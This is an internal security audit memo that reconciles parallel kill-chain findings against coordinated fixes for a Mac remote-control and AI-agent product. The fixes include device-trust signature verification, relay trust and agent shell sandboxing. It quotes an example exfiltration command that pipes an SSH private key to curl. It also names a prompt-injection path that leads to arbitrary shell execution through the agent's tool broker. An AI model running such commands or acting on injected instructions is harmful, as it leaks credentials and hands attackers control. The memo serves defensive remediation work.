# Parallel kill-chain audit — reconciliation with the coordinated remediation (2026-06-09)

An independent offensive review traced ONE kill-chain end-to-end —
*malicious peer/server/relay connects → code executes on the victim Mac, or
screen/keystrokes/data are exfiltrated* — and began a parallel remediation
before discovering the in-flight coordinated work in
[`SECURITY_REMEDIATION_2026-06-09.md`](SECURITY_REMEDIATION_2026-06-09.md).

Per the owner's call, the parallel work was reconciled: **keep the one
plausibly net-new fix (B1, already committed + tested); revert the overlapping
in-progress edits; leave C-3 to its owner.** This memo records the mapping so
nothing is lost and no one re-does it.

## Mapping (parallel finding → coordinated item → disposition)

| Parallel finding | Their item | Disposition |
|---|---|---|
| **B1** — `approveEscrowDeviceTrust` never cryptographically verified the device-trust-chain signature (stored it verbatim) | adjacent to **C-2** (escrow trust); their C-2 design is *client-side verify-before-wrap* + fingerprint backstop, and does **not** include server-side signature verification | **KEPT — committed** (`8a673cbc2`). See details below. |
| **A1/A2** — Swift `AgentToolBroker` shell tool: no per-action approval + weak `(allow default)` sandbox | **C-4** (agent command-guard, fail-closed) | **REVERTED.** C-4 is done in the *Python* hermes-agent fork and deliberately rejected a blanket `sandbox-exec`. See residual-gap note. |
| **B3** — live relay-request plane trusts server `trustState` instead of a device-rooted chain | **C-1 / H-2 / F1–F6** (authenticated+pinned relay, Signal-identity gate, Mac-rooted trust) | **REVERTED** as duplicative of the trust-root work. See residual-gap note. |
| **C1** — at-rest readers swallow sender-auth failures and fall through to the unauthenticated legacy opener | F5-adjacent (sender-auth downgrade) | Swept into `8a673cbc2` (3 readers now consult `SignalAtRestFallbackPolicy`, fail-closed on `.senderAuthMissing/.senderSignatureInvalid/.bindingMismatch` + wrapper `signalBindingMismatch`). Owner: confirm desired. |
| **A4** — `InsightMissionApprovalPolicy` `default:` returned `false` (fail-open direction) | — | Swept into `8a673cbc2`; `default:` now returns `true` (fail-closed) + 7 tests pass. |
| **C3** — phone-control replay counter in-memory only (replayable after daemon restart) | **C-3** | **Collision** — owner implemented C-3 concurrently (`PhoneControlReplayCounterStore.swift` + `replayCounterPersistenceFailed`). Left entirely to them; my scaffolding residue (a `replayCounterStore` property + load-on-init) was incorporated by their version. |
| **D1** — chunk-drop silent truncation on Firestore-fallback + Android | **F4** | Already committed (`2dff9416c`) for iOS realtime; Firestore-fallback + Android parity is their tracked follow-up. |
| **A3** — local-auth "proof" is self-signed by the controller key (no independent 2nd factor) | defense-in-depth once **B1+C-1+F1-F6** close the entry path | Not implemented (needs a Secure-Enclave-distinct key + Mac challenge-nonce + cross-platform wire change + on-device test). Design below. |

## KEPT — B1 (details for the C-2 / `computerUseSecurity.ts` owner)

**This edited your hot file `functions/src/callables/computerUseSecurity.ts`; it
is now in HEAD (`8a673cbc2`). Coordinate before rebasing C-2 onto it.**

- Added a pure `node:crypto` **XEdDSA (XEd25519 over Curve25519)** verifier
  (`verifyXEdDSACurve25519Signature`) mirroring vendored libsignal
  `curve25519::PrivateKey::verify_signature` — the trust-chain signature is
  libsignal XEdDSA over a 33-byte DJB key (`0x05‖X`), **not** plain Ed25519, so
  the existing `verifyEd25519RawSignature` could not be reused (a naive reuse
  would have fail-closed-rejected every legitimate approval).
- `buildCloudVaultDeviceTrustChainCanonicalBytes` reconstructs the exact bytes
  the client signs (`CloudVaultDeviceTrustChain.canonicalPayload`: domain line +
  nine length-prefixed `{utf8ByteCount}:{segment}\n` pairs); 5 fields from
  authoritative server context, 4 from the validated proof.
- `verifyCloudVaultDeviceTrustChainSignature` loads the approver's published
  `publicKeyData` from the already-fetched (immutable, attacker-uncontrolled)
  `signal_identity_public_keys` doc — never from the proof. Wired **after** the
  approver-identity checks and **before** `transaction.set`, fail-closed
  `permission-denied` on any decode/curve/verify failure. Bootstrap self-approval
  verifies against the device's own published key.
- **B2 (bonus):** bootstrap self-approval now hard-requires a single-use
  high-risk nonce when `enforceAppCheck` (prod), independent of the global
  `requireHighRiskNonce` flag (`appCheckAttestation.ts` now returns
  `{ nonceConsumed }`).
- **Tests (committed):** `escrowDeviceTrustChainSignature.test.ts` (KATs from
  *real vendored libsignal*, both sign-bit cases),
  `approveEscrowDeviceTrustHandler.test.ts`, `appCheckAttestation.test.ts`.
  407 vitest pass (403/4-skip), tsc clean, firestore-rules emulator 52/52.
- **Relationship to C-2:** complementary, not a substitute. B1 stops the
  *server* from rubber-stamping an unverified chain; C-2's client-side
  verify-before-wrap stops a *compromised backend* from harvesting the vault
  key. Land both.

## REVERTED — residual gaps the owners should weigh

1. **Swift `AgentToolBroker` shell surface (A1/A2) is back to its original state.**
   `AgentLens/Services/CLIBridge/OpenAICompatibleChatGatewayClient.swift` still
   has: (a) `shell_run`/`workspace_write_file`/`desktop_export_file` executing
   with **no per-action approval** once a grant is active, and (b) the
   `(allow default)` + out-of-workspace-write-deny sandbox that leaves **outbound
   network and secret-store reads open** (`cat ~/.ssh/id_rsa | curl …`). C-4
   hardened the *Python* hermes-agent guard, not this *Swift* broker. **Decision
   needed:** is this Swift surface in scope, and if so apply C-4's precise-guard
   philosophy here (vs. the reverted sandbox-exec approach). The reverted A2
   profile was OS-validated to deny network + `~/.ssh`/Keychains/Messages reads +
   out-of-workspace writes while keeping `git`/`2>/dev/null`/system reads working
   — available if a sandbox approach is wanted for this surface.

2. **Live relay-request plane device-rooted trust (B3) reverted.**
   `FirestoreHermesRelaySenderTrustResolver.fetchTrustedSenderRecord` still gates
   on the server-asserted `escrow_devices.trustState == "trusted"` (+ HPKE-Auth
   to a server-served key) and does **not** run the device-rooted
   `CloudVaultTrustedDeviceChainVerifier` the at-rest path uses. If C-1/H-2/F1-F6
   already bind this resolver's trust to a Mac-rooted chain, this is closed;
   **confirm the resolver specifically is covered**, otherwise a full
   Admin-SDK-`trustState` forge still reaches the live remote-control plane.
   (Reverted approach: re-verify the sender's chain against the Mac's local
   Signal identity and bind the relay record's `signalIdentityKeyId`/fingerprint
   to the chain-verified device, fail-closed.)

3. **A3 (self-signed local-auth proof) — design, not implemented.** The
   "biometric" local-auth proof is verified only against the controller's *own*
   pinned key (`PhoneControlAuthorityValidator.validateLocalAuthProofIfNeeded`),
   so a device holding a trusted controller key can mint its own proof. Now
   defense-in-depth (B1 + C-1/F1-F6 close the entry path). SOTA fix: a
   Secure-Enclave key provably distinct from the transport/controller key,
   provisioned behind biometry, pinned at enrollment, signing a fresh
   Mac-issued challenge nonce (single-use). Cross-platform wire change (iOS +
   Android `HermesRealtimeRelayAgentGrantLocalAuthProof`) + on-device test.

## The kill-chain (for reference)

Entry (enroll/impersonate a device → live control) is closed by **B1**
(server verifies the chain) + **C-1/C-2/H-2/F1-F6** (authenticated relay +
Mac-rooted trust). Escalation (peer message → code execution) is the agent
tool surface — **C-4** (Python guard) + residual-gap #1 (Swift broker). The
single most dangerous residual, if #1 is unowned, is **prompt-injection →
`shell_run` → arbitrary read/network exec** inside an active grant on the Swift
broker.
